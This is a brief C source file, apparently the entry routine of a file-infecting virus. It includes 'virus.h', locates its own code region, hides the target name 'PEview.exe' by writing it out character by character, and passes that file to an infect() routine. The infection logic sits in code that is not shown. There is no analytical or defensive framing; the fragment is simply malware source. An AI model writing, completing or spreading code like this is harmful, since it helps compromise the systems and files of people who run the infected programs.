#include "virus.h"

int run(void) {
  data_t data;

  assert(code_begin < code_end);
  assert((void*)run >= (void*)code_begin &&
         (void*)run < (void*)code_end);
  
  if (init_data(&data, (void*)code_begin, (void*)code_end, (uint8_t*)run - (uint8_t*)code_begin) != 0) {
    return -1;
  }

  char lel[20];
  lel[0] = 'P';
  lel[1] = 'E';
  lel[2] = 'v';
  lel[3] = 'i';
  lel[4] = 'e';
  lel[5] = 'w';
  lel[6] = '.';
  lel[7] = 'e';
  lel[8] = 'x';
  lel[9] = 'e';
  lel[10] = 0;
  return infect(lel, &data);
}
